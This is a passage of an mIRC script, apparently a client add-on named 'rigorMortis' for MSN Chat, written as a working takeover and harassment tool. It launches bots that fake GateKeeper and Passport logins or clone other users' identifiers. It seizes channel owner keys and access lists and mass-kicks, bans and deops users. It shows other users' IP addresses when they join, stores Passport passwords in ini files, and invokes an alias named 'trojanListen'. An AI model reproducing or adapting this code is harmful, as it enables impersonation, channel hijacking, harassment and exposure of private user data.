    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, +q )
  }
  elseif ( MASSDEOWNER == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, -q )
  }
  elseif ( MASSOP == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, +o )
  }
  elseif ( MASSDEOP == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, -o )
  }
  elseif ( MASSVOICE == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, +v )
  }
  elseif ( MASSDEVOICE == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massMode( %t, %c, -v )
  }
  elseif ( MASSKICK == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massKick( %t, %c )
  }
  elseif ( MASSBAN == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massBan( %t, %c )
  }
  elseif ( MASSBANLIST == $1 ) {
    var %c, %t
    %c = $active
    %t = $iif( $2, $2, all )
    %t = $massModeType(%t)
    $massBanList( %t, %c )
  }
  elseif ( LISTSOCK == $1 ) {
    $listSock
  }
  elseif ( BOT == $1 ) {
    var %id, %ip, %c, %sk, %n, %g 
    %id = $hexString
    %c = $active
    %ip = $$sock($$getSock(%c)).ip
    %n = $iif( $2, $2, $randBotNick ) 
    $ocx.init( %id, %ip, bot )
    %sk = $+( bot., %id )
    sockopen %sk %ip 6667
    sockmark %sk %c 
    $setBotNick( %sk, %n ) 
    $setBotSock( %c, %sk )
    %g = $iif( $3, $3, $getGateKeeperType )
    $setGateKeeperType(%g)
  }
  elseif ( BOTCLOSE == $1 ) {
    var %c, %s
    %c = $active
    %s = $getBotSock(%c)
    sockclose %s
    sockwrite -n $getSock(%c) $+( ACCESS %c delete owner *!, $getBotGate(%s), $chr(36), * )
  } 
  elseif ( BOTCLOSEALL == $1 ) { sockwrite -n bot.???????????????? $+( QUIT :, $sockMrc $vers ) }
  elseif ( BOTHOPALL == $1 ) { 
    var %i, %c
    %i = 1
    while ( %i <= $sock( bot.????????????????, 0 ) ) {
      BOTHOP $sock( bot.????????????????, %i ).mark
      inc %i
    }
  }
  elseif ( BOTJOIN == $1 ) {
    var %c, %s
    %c = $iif( $2, $2, $active )
    %s = $getBotSock(%c)
    sockwrite -n $getSock(%c) $+( ACCESS %c add owner *!, $getBotGate(%s) 0 :, $sockMrc $vers, $crlf, ACCESS %c add voice *!, $gettok( $getBotGate(%s), 1, 64 ), @* 0 :, $sockMrc $vers )
    sockwrite -n %s JOIN %c $getKey( $mid( %c, 2 ), q )
    $setBotCloneStatus(off)
  }
  elseif ( BOTHOP == $1 ) {
    var %c, %s
    %c = $iif( $2, $2, $active )
    %s = $getBotSock(%c)
    sockwrite -n $getSock(%c) $+( ACCESS %c add owner *!, $getBotGate(%s) 0 :, $sockMrc $vers, $crlf, ACCESS %c add voice *!, $gettok( $getBotGate(%s), 1, 64 ), @* 0 :, $sockMrc $vers )
    sockwrite -n %s $+( PART %c, $crlf, JOIN %c $getKey( $mid( %c, 2 ), q ) )
  }
  elseif ( BOTKICK == $1 ) {
    var %c, %s
    %c = $active
    %s = $getBotSock(%c) 
    sockwrite -n %s $+( ACCESS %c clear owner, $crlf, KICK %c $$2 :, $3-, $crlf, PROP %c ownerkey $key, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( BOTBAN == $1 ) {
    var %c, %s
    %c = $active
    %s = $getBotSock(%c) 
    sockwrite -n %s $+( ACCESS %c clear owner, $crlf, ACCESS %c add deny *!, $$ial( $$2, 1 ).addr 0 :, $sockMrc $vers, $crlf, KICK %c $$2 :, $3-, $crlf, PROP %c ownerkey $key, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( BOTCLONE == $1 ) {
    var %c, %s, %n, %g, %id, %ip, %c, %sk
    %c = $active
    %s = $getBotSock(%c)
    %n = $iif( $2, $2, $randBotNick )
    %g = $iif( $3, $3, $getGateKeeperType )
    $setGateKeeperType(%g)
    $setBotCloneStatus(on)
    $setBotCloneOld(%s)
    %id = $hexString
    %ip = $$sock($$getSock(%c)).ip
    $ocx.init( %id, %ip, bot )
    %sk = $+( bot., %id )
    sockopen %sk %ip 6667
    sockmark %sk %c 
    $setBotNick( %sk, %n ) 
    $setBotSock( %c, %sk )
  }
  elseif ( BOTNICK == $1 ) {
    var %c, %s, %n
    %c = $active
    %s = $$getBotSock(%c)
    %n = $+( $iif( $left( $$2, 1 ) != >, > ), $$2 )
    sockwrite -n %s NICK %n
    $setBotNick( %s, %n )
  }
  elseif ( BOTDEOWNER == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c -qo $$2 $$2, $crlf, PROP %c ownerkey $key, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( BOTDEOP == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c -qo $$2 $$2, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add host '*!*@* 0 :, $mrc $vers )
  }
  elseif ( BOTDEVOICE == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c -v $$2, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add host '*!*@* 0 :, $mrc $vers )
  }
  elseif ( BOTVOICE == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c v $$2, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add host '*!*@* 0 :, $mrc $vers )
  }
  elseif ( BOTOWNER == $1 ) {
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) MODE %c +q $$2
  }
  elseif ( BOTOP == $1 ) {
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) MODE %c +o $$2
  }
  elseif ( BOTHOST == $1 ) {
    var %c
    %c = $active
    writeini -n ahost.ini $mid( %c, 2 ) $$ial( $$2, 1 ).addr $$2 Bot add
    BOTOP $$2
  }
  elseif ( BOTDEHOST == $1 ) {
    var %c
    %c = $active
    remini -n ahost.ini $mid( %c, 2 ) $$ial( $$2, 1 ).addr
    BOTDEOP $$2
  }
  elseif ( BOTAOP == $1 ) {
    var %c
    %c = $active
    writeini -n aop.ini $mid( %c, 2 ) $$ial( $$2, 1 ).addr $$2 Bot add
    BOTOWNER $$2
  }
  elseif ( BOTDEAOP == $1 ) {
    var %c
    %c = $active
    remini -n aop.ini $mid( %c, 2 ) $$ial( $$2, 1 ).addr
    BOTDEOWNER $$2
  }
  elseif ( BOTMODE == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) MODE %c $$2-
  }
  elseif ( BOTTEASE == $1 ) {
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c $str( +q-q, 13 ) $str( $$2 $chr(32), 26 ), $crlf, PROP %c ownerkey $key, $crlf, ACCESS %c clear owner, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( BOTMOD == $1 ) {
    var %c, %i, %n, %p, %s
    %c = $active
    %n = $$2
    %i = 1
    while ( %i <= $nick( %c, 0, r ) ) {
      %p = $nick( %c, %i, r ) 
      if ( %p != %n ) { %s = $+( %s, $chr(32), %p ) }
      inc %i
    }
    sockwrite -n $$getBotSock(%c) $+( MODE %c  +m-v, +, $str( v, $numtok( %s, 32 ) ), $chr(32), %n %s )
  }
  elseif ( BOTRAW == $1 ) { sockwrite -n $$getBotSock($active) $replace( $$2-, chan, $active ) }
  elseif ( $chr(37) == $left( $2, 1 ) ) { sockwrite -n $$getSock($2) %r }
  else { sockwrite -n $$sock( rigorMortis.???????????????? ) %r }
}

alias -l subUserListBan {
  var %n, %g, %r
  %n = $ini( banlist.ini, $1 )
  %g = $readini( banlist.ini, %n, nick )
  %r = $readini( banlist.ini, %n, reason )
  if ( $1 == begin || $1 == end ) { return - }
  elseif ( %r ) { return $+( %g, $chr(9), - %r ) : remini -n banlist.ini %n }
}


alias -l subUserList {  
  if ( $1 == begin || $1 == end ) { return - }
  elseif ( $ini( $+( $2, .ini ), $3, $1 ) ) {   
    var %n, %g, %i
    %n = $ifmatch
    %i = $+( $2, .ini )
    %g = $readini( %i, $3, %n )
    return $+( $gettok( %g, 1, 32 ), $chr(9), - $gettok( %g, 2-, 32 ) ) : remini -n %i $3 %n 
  }
}

on *:sockread:bot.????????????????:{
  var %r 
  sockread %r 
  while ( $sockbr ) { 
    tokenize 32 %r 
    if ( AUTH == $1 ) {
      if ( AUTH * S :GKSSP\0* iswm $1-5 ) {
        var %s
        %s = $client.sock($sockname)
        if ( $sock(%s).status == active ) { sockwrite -n %s %r }
        else { 
          $print( 5, -st, Ocx for $sockname has not connected ) 
          $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) 
          $ocx.close( s, $sockname ) 
        }
      }
      elseif ( AUTH \0\0\0 ? ????????????????* iswm $1-4 ) { 
        $setBotGate( $sockname, $4 )
        if ( $getBotCloneStatus != on ) { editbox -f $sock($sockname).mark /botJoin }
        else {
          var %c, %s
          %c = $sock($sockname).mark
          %s = $sockname
          sockwrite -n $$sock($getBotCloneOld) $+( Quit :, $sockMrc $vers )
          sockwrite -n $getSock(%c) $+( ACCESS %c add owner *!, $getBotGate(%s) 0 :, $sockMrc $vers, $crlf, ACCESS %c add voice *!, $gettok( $getBotGate(%s), 1, 64 ), @* 0 :, $sockMrc )
          sockwrite -n %s JOIN %c
          $setBotCloneStatus(off) 
        }
      }
    } 
    elseif ( MODE == $2 ) {
      if ( $4 == -q ) {
        if ( $getBotNick($sockname) == $5 ) { 
          if ( $getBotNick($sockname) != $mid( $gettok( $1, 1, 33 ), 2 ) ) && ( !%bot-qfld. [ $+ [ $3 ] ] ) {
            sockwrite -n $sockname $+( MODE $getBotNick($sockname) +h $getKey( $mid( $3, 2 ), q ), $crlf, KICK $3 $mid( $gettok( $1, 1, 33 ), 2 ) :, $sockMrc $vers, $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 clear owner )
            inc -u5 %!bot-qfld. [ $+ [ $3 ] ]
          }
        }
        elseif ( $5 == $me ) && ( $me != $mid( $gettok( $1, 1, 33 ), 2 ) ) && ( !%bot-qprotfld. [ $+ [ $3 ] ] ) {
          sockwrite -n $sockname $+( MODE $3 +q-q $me $mid( $gettok( $1, 1, 33 ), 2 ), $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 clear owner )
          inc -u5 %bot-qprotfld. [ $+ [ $3 ] ]
        }
      }
      elseif ( $4 == +q ) {
        if ( $popup.check( sockDeowner, $3 ) == on ) && ( !$ini( aop.ini, global, $ial( $5, 1 ).addr ) ) && ( !$ini( aop.ini, $mid( $3, 2 ), $ial( $5, 1 ).addr ) ) && ( $5 != $getBotNick($sockname) ) && ( !%sockno+q. [ $+ [ $3 ] ] ) && ( $5 != $me ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $getBotNick($sockname) ) {
          sockwrite -n $sockname $+( MODE $3 -qo $5 $5, $crlf, ACCESS $3 clear owner, $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 add owner *!, %gate 0 :, $sockMrc $vers )
          inc -u2 %sockno+q. [ $+ [ $3 ] ]
        }
        elseif ( $5 == $getBotNick($sockname) ) && ( $left( $getBotNick, 1 ) != > ) && ( !%bot+qfld. [ $+ [ $3 ] ] ) { 
          sockwrite -n $sockname $+( ACCESS $3 add owner *!, $getBotGate($sockname) 0 :, $sockMrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( $getBotGate($sockname), 1, 64 ), @* 0 :, $sockMrc $vers, $crlf, PROP $3 ownerkey $key )
          inc -u5 %bot+qfld. [ $+ [ $3 ] ]
        }
      }
      elseif ( $4 == +o ) {
        if ( $popup.check( sockDeop, $3 ) == on ) && ( !$ini( ahost.ini, global, $ial( $5, 1 ).addr ) ) && ( !$ini( ahost.ini, $mid( $3, 2 ), $ial( $5, 1 ).addr ) ) && ( $5 != $getBotNick($sockname) ) && ( !%sockno+o. [ $+ [ $3 ] ] ) && ( $5 != $me ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $getBotNick($sockname) ) {
          sockwrite -n $sockname $+( MODE $3 -qo $5 $5, $crlf, ACCESS $3 clear host, $crlf, PROP $3 hostkey $key, $crlf, ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add host '*!*@* 0 :, $mrc $vers )
          inc -u2 %sockno+o. [ $+ [ $3 ] ]
        }  
      }
    }
    elseif ( KICK == $2 ) { 
      if ( $4 == $me ) { 
        sockwrite -n $sockname $+( KICK $3 $mid( $gettok( $1, 1, 33 ), 2 ) :, $sockMrc $vers, $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 clear deny, $crlf, ACCESS $3 clear owner ) 
        sockwrite -n $$getSock($3) JOIN $3 $getKey( $mid( $3, 2 ), q )
      }
    }
    elseif ( PROP == $2 ) {
      if ( $4 == ownerkey ) {
        if ( $5 == : ) {
          var %n
          %n = $mid( $gettok( $1, 1, 33 ), 2 )
          if ( %n != $getBotNick($sockname) ) && ( %n != $me ) && ( !%botnullf. [ $+ [ $3 ] ] ) {
            var %g
            %g = $gettok( $1, 2, 33 )
            sockwrite -n $sockname $+( KICK $3 %n :, $sockMrc $vers, $crlf, ACCESS $3 add deny *!, %g 0 :, $sockMrc $vers, $crlf, ACCESS $3 clear owner, $crlf, PROP $3 ownerkey $key )
            remini -n aop.ini $mid( $3, 2 ) %g
            inc -u3 %botnullf. [ $+ [ $3 ] ]
          }
        }
        $setKey( $mid( $3, 2 ), q, $5 )
      }
    }
    elseif ( JOIN == $2 ) { 
      var %n
      %n = $mid( $gettok( $1, 1, 33 ), 2 )
      if ( %n == $getBotNick($sockname) ) {
        if ( $left( %n, 1 ) == > ) { sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) delete owner *!, $getBotGate($sockname), $chr(36), * ) }
      }
      elseif ( $gettok( $3, 4, 44 ) == . ) && ( $popup.check( botNoAccess, $mid( $4, 2 ) ) == on ) && ( !$ini( aop.ini, global, $gettok( $1, 2, 33 ) ) ) && ( !$ini( aop.ini, $mid( $4, 3 ), $gettok( $1, 2, 33 ) ) ) && ( %n != $me ) && ( !%botaccessq. [ $+ [ $mid( $4, 2 ) ] ] ) { 
        sockwrite -n $sockname $+( MODE $mid( $4, 2 ) -qo %n %n, $crlf, PROP $mid( $4, 2 ) ownerkey $key, $crlf, ACCESS $mid( $4, 2 ) clear owner, $crlf, ACCESS $mid( $4, 2 ) add owner *!, %gate 0 :, $mrc $vers )
        inc -u4 %botaccessq. [ $+ [ $mid( $4, 2 ) ] ]
      }
      elseif ( $gettok( $3, 4, 44 ) == @ ) && ( $popup.check( botNoAccess, $mid( $4, 2 ) ) == on ) && ( !$ini( ahost.ini, global, $gettok( $1, 2, 33 ) ) ) && ( !$ini( ahost.ini, $mid( $4, 3 ), $gettok( $1, 2, 33 ) ) ) && ( %n != $me ) && ( !%botaccesso. [ $+ [ $mid( $4, 2 ) ] ] ) { 
        sockwrite -n $sockname $+( MODE $mid( $4, 2 ) -qo %n %n, $crlf, PROP $mid( $4, 2 ) hostkey $key, $crlf, ACCESS $mid( $4, 2 ) clear host, $crlf, ACCESS $mid( $4, 2 ) add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $mid( $4, 2 ) add host '*!*@* 0 :, $mrc $vers )
        inc -u4 %botaccesso. [ $+ [ $mid( $4, 2 ) ] ]
      }
      elseif ( %n == $me ) { sockwrite -n $sockname MODE $mid( $4, 2 ) +qv $me $me }
    }
    elseif ( PING == $1 ) { sockwrite -n $sockname PONG $2 }
    elseif ( $gettok( %r, 2, 32 ) == 910 ) { 
      $print( 5, -st, Auth failure for $sockname )
      $addReconnectQue( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ), $getBotNick($sockname), $sock($sockname).mark) )
      sockclose $sockname
      if ( !%updateFlood ) { 
        $update( $mid( $getSockPp, 2 ), $readini( passport.ini, $mid( $getSockPp, 2 ), password ) )
        inc -u5 %updateFlood
      }
    }
    elseif ( !%keepAlive. [ $+ [ $sockname ] ] ) {   
      sockwrite -n $sockname
      inc -u5 %keepAlive. [ $+ [ $sockname ] ]
    }
    if ( $sock($sockname) ) { sockread %r }
  }
}

on *:sockopen:bot.????????????????:{ 
  if ( !$sockerr ) { sockwrite -n $sockname $+( NICK $getBotNick($sockname), $crlf, AUTH GateKeeper, $iif( $left( $getBotNick($sockname), 1 ) != >, Passport, $chr(32) ) I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!9.02.0310.2401 ) }
  else { $print( 5, -st, Error connecting - $sockname server is down ) }
}

menu status {
  $iif( $server == rigorMortis, Global settings )
  .$+( $iif( %gaop != off, $style(1) ), Global owner list ) : set %gaop $iif( $popup.check( gaop ) == on, off, on )
  .$+( $iif( %gahost != off, $style(1) ), Global op list ) : set %gahost $iif( $popup.check( gahost ) == on, off, on )
  .$+( $iif( %gavoice != off, $style(1) ), Global voice list ) : set %gavoice $iif( $popup.check( gavoice ) == on, off, on )
  .$+( $iif( %banlist != off, $style(1) ), Global ban list ) : set %banlist $iif( $popup.check( banlist ) == on, off, on )
  .-
  .$+( $iif( %laop != off, $style(1) ), Channel owner list ) : set %laop $iif( $popup.check( laop ) == on, off, on )
  .$+( $iif( %lahost != off, $style(1) ), Channel op list ) : set %lahost $iif( $popup.check( lahost ) == on, off, on )
  .$+( $iif( %lavoice != off, $style(1) ), Channel voice list ) : set %lavoice $iif( $popup.check( lavoice ) == on, off, on )
  .- 
  .$+( $iif( %tag != off, $style(1) ), User ID ) : set %tag $iif( $popup.check( tag ) == on, off, on )
  .$+( $iif( %hopprot != off, $style(1) ), Hop prot ) : set %hopprot $iif( $popup.check( hopprot ) == on, off, on )
  .$+( $iif( %joinf != off, $style(1) ), Join flood prot ) : set %joinf $iif( $popup.check( joinf ) == on, off, on )
  .$+( $iif( %font != off, $style(1) ), Show fonts ) : set %font $iif( $popup.check( font ) == on, off, on )
  .$+( $iif( %chanProt != off, $style(1) ), Channel protection ) : set %chanProt $iif( $popup.check( chanProt ) == on, off, on )
  .-
  .Reset settings : {
    unset %*aop
    unset %*ahost
    unset %*avoice
    unset %banlist
    unset %tag 
    unset %hopprot
    unset %joinf
    unset %font
    unset %chanProt
  }
  $iif( $server == rigorMortis && $sock(findServer.????????????????), Channel creation )  
  .$+( Quick, $chr(9), - ... ) : CREATE $$?="channel ?"
  .$+( Dialog, $chr(9), - ... ) : dialog -m create create
  $iif( $server == rigorMortis, Room list ) : $roomList( $?="Category ?", $?="Page ? " )
  $iif( rigorMortis == $server, Passports )
  .$+( $style(2), $iif( $len( $getCurPp ) >= 6, $+( Selected Pp, $chr(9), - $hexToAscii($getCurPp) ), No Pp ) ) : null
  .$+( $style(2), $iif( $getGkp($getCurPp), $+( Selected Gkp, $chr(9), - $getGkp($getCurPp) ), No Gkp ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getCurPp), $+( Selected updated dur, $chr(9), - $duration($calc( $ctime - $getLastUpdate($getCurPp) )) ago), No update ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getCurPp), $+( Selected pp subscribed, $chr(9), - $iif( $getSubscribed($getCurPp), true, false ) ), No pp ) ) : null
  .$submenu($subPp($1))
  .$+( Passport add, $chr(9), - ... ) {
    var %pp, %pw
    %pp = $$?="Passport to add ?"
    %pw = $$?="Password for %pp ?"
    %pw = $mid( $asciiToHex( s, %pw ), 2 )
    %pp = $mid( $asciiToHex( s, %pp ), 2 )
    writeini -n passport.ini %pp password %pw
    if ( $len($getCurPp) <= 3 ) { $setCurPp(%pp) }
    $update( %pp, %pw )
  }
  .$+( Passport remove, $chr(9), - selected ) {
    remini -n passport.ini $mid( $getCurPp, 2 )
    $setCurPp(.)
  }
  .$+( Passport update, $chr(9), - selected ) : $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
  $iif( rigorMortis == $server, GateKeeper )
  .$+( $style(2), Selected, $chr(9), - $getGateKeeper ) : null
  .$+( $iif( $getGateKeeperType == binary, $style(1) ), Binary, $chr(9), - $getGateKeeper(binary) ) : $setGateKeeperType(binary)
  .$+( $iif( $getGateKeeperType == octal, $style(1) ), Octal, $chr(9), - $getGateKeeper(octal) ) : $setGateKeeperType(octal)
  .$+( $iif( $getGateKeeperType == denary, $style(1) ), Denary, $chr(9), - $getGateKeeper(denary) ) : $setGateKeeperType(denary)
  .$+( $iif( $getGateKeeperType == hex, $style(1) ), Hexadecimal, $chr(9), - $getGateKeeper(hex) ) : $setGateKeeperType(hex)
  .$+( $iif( $getGateKeeperType == WEBTV, $style(1) ), WEB-TV, $chr(9), - $getGateKeeper(WEBTV) ) : $setGateKeeperType(WEBTV)
  .$+( $iif( $getGateKeeperType == clone, $style(1) ), Clone, $chr(9), - $getGateKeeper(clone) ) : { $setGateKeeperClone($$?="GateKeeper to clone ?") | $setGateKeeperType(clone) }
  .$+( $iif( $getGateKeeperType == normal || !$getGateKeeperType, $style(1) ), Normal, $chr(9), - $getGateKeeper(normal) ) : $setGateKeeperType(normal)
  $iif( $server == rigorMortis, Misc commands )
  .$+( Findu, $chr(9), - ... ) : findu $$?="Findu ?"
  .$+( Who, $chr(9), - ... ) : who $$?="Who ?"
  .$+( Whois, $chr(9), - ... ) : whois $$?="Whois ?" 
  .$+( Notice, $chr(9), - ... ) : notice $$?="Who ? Message ?"
  .$+( Mass notice, $chr(9), - ... ) : massnotice $$?="Message ?"
  .$+( Users scan, $chr(9), - ) : $userScan(#)
  .$+( Join, $chr(9), - ... ) : join $$?="Join ?"
  .$+( Part all, $chr(9), - ) : partall
  .$+( Hop all, $chr(9), - ) : hopall
  .$+( Nick, $chr(9), - ... ) : $clone( $$?="Nick ?" )
  .$+( Quit, $chr(9), - ) : quit null
  .$+( Kick match, $chr(9), - ... ) : $kickMatch( $$?="Wild card ?" )
  .$+( Ban match, $chr(9), - ... ) : $banMatch( $$?="Wild card ?" )
  $iif( $server == rigorMortis, User lists )
  .Owner
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, aop, global ))
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n aop.ini global %u %n %r
    %i = 1
    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gaop, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        $clientQue(MODE %cc +qv %n %n)
      }
      inc %i
    }
  }
  .Op
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, ahost, global ))
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n ahost.ini global %u %n %r
    %i = 1
    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gahost, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        if ( %n !isowner %cc ) { $clientQue(MODE %cc +ov %n %n) }
      }
      inc %i
    }
  }
  .Voice
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, avoice, global ))  
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n avoice.ini global %u %n %r
    %i = 1
    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gavoice, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        $clientQue(MODE %cc +v %n)
      }
      inc %i
    }
  }
  .Ban
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserListBan($1))
  ..$+( Add, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n banlist.ini %u nick %n
    writeini -n banlist.ini %u reason %r
    %c = 1
    while ( %c <= $comchan( %n, 0 ) ) { 
      %cc = $comchan( %n, %c )
      $clientQue( ACCESS %cc add deny $+( *!, $gettok( %u, 1, 64 ), @* 0 :, $mrc $vers ) )
      $clientQue( KICK %cc %n $+( :, 5Banlist, $chr(3), 2 %n ', $chr(3), 5, %r, $chr(3), 2' ) ) 
      inc %c
    }
  }
}

on *:join:#:{
  if ( $nick == $me ) && ( rigorMortis == $server ) {  
    $print( $color(info2), -t #, $+( Gate is ', $gettok( %gate, 1, 64 ), ' ) )
    $print( $color(info2), -t #, $+( Ownerkey is ', $mid( $getKey( $mid( #, 2 ), q ), 2 ), ' ) )
    $print( $color(info2), -t #, $+( Server is ', $getKey( $mid( #, 2 ), server ), ' ) )
  }
  elseif ( $ial( $nick, 1 ).addr == $hget( Ip. [ $+ [ # ] ], gkp ) ) {  
    $print( $color(info2), -t #, $+( $nick, 's current ip is ', $hget( Ip. [ $+ [ # ] ], ip ), ' ) )
  }
  elseif ( $ini( ip.ini, $ial( $nick, 1 ).addr ) ) {
    var %i 
    %i = $ifmatch
    %i = $ini( ip.ini, %i )
    $print( $color(info2), -t #, $+( $nick, 's ip is ', $readini( ip.ini, %i, ip ), ' $chr(40), $duration($calc( $ctime - $readini( ip.ini, %i, time ) )) ago, $chr(41) ) )
  } 
  if ( $nick != $me ) {
    if ( $getGateKeeperNicks($nick) ) { $print( 2, -t #, $ifmatch ) }
    $setGateKeeperNicks($nick)
    if ( $getPassport($ial($nick).addr) ) { $print( 2, -t #, $+( $nick, 's passport is ', $chr(3), 5, $ifmatch, $chr(3), 2' ) ) }
  }
}

on *:socklisten:init.client.mirc:{
  clear 
  sockaccept client.mirc
  sockclose init.client.mirc
  sockwrite -n client.mirc :rigorMortis 001 $me :
  $print( , -se, $mrc $vers )
  $print( , -s, $+( Connected to local computer $chr(40), $me, $chr(41) ) )
  if ( $len($getCurPp) >= 4 ) {
    var %d
    %d = $calc( $ctime - $getLastUpdate($getCurPp) )
    $print( , -s, Selected passport - $hexToAscii($getCurPp) ) 
    $print( , -s, Selected passport gkp - $getGkp($getCurPp) )
    $print( , -s, Selected passport updated - $duration(%d) ago ) 
    $print( , -s, Selected passport subscribed - $iif( $getSubscribed($getCurPp), yes, no ) )
    echo $color(info) -s -
    if ( %d >= 3600 ) { $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) ) }
  }
  editbox -sf /msn
  $trojanListen
  $motd
}

on *:start:{ 
  client.connect
  .hmake rigorMortis 200
  if ( !$exists(c:\rigorMortis) ) { mkdir c:\rigorMortis\ }
  if ( !$exists(passport.ini) ) { writeini -n passport.ini settings curPp . }
  if ( !$getGateKeeperClone ) { $setGateKeeperClone($str( 0, 31 )) }
  %useSub = off
  %sockDeowner = off
  %sockDeop = off
  %botNoAccess = off
  %chanProt = off
  .flood 350 9999 10 0
}
on *:load:{ run $+( $scriptdir, readMe.txt ) }

alias -l conGkp {
  var %pp, %as, %id, %sk, %ip
  %pp = $mid( $$1, 2 )
  %as = $$readini( passport.ini, %pp, authString )
  %id = $hexString
  %ip = 207.68.167.157
  %sk = $+( gkp., %id )
  $ocx.init( %id, %ip, gkp )
  sockopen %sk %ip 6667
  sockmark %sk %pp %as
}

on *:sockopen:gkp.????????????????:{ sockwrite -n $sockname $+( AUTH GateKeeperPassport I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0 ) }

on *:sockread:gkp.????????????????:{
  var %r
  sockread %r
  if ( AUTH == $left( %r, 4 ) ) {
    if ( AUTH * S :GKSSP\0* iswm %r ) {
      var %s
      %s = $client.sock($sockname)
      if ( $sock(%s).status == active ) { sockwrite -n %s %r }
      else { 
        $print( 5, -st, Ocx for $sockname has not connected ) 
        $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) 
        $ocx.close( s, $sockname ) 
      }
    }
    elseif ( AUTH \0\0\0 ? ????????????????* iswm %r ) {  
      $setGkp( $+( $chr(37), $gettok( $sock($sockname).mark, 1, 32 ) ), $gettok( $gettok( %r, 4, 32 ), 1, 64 ) )
      writeini -n passports.ini $gettok( %r, 4, 32 ) passport $hexToAscii( $+( $chr(37), $gettok( $sock($sockname).mark, 1, 32 ) ) )
      sockclose $sockname
    }
  }
}
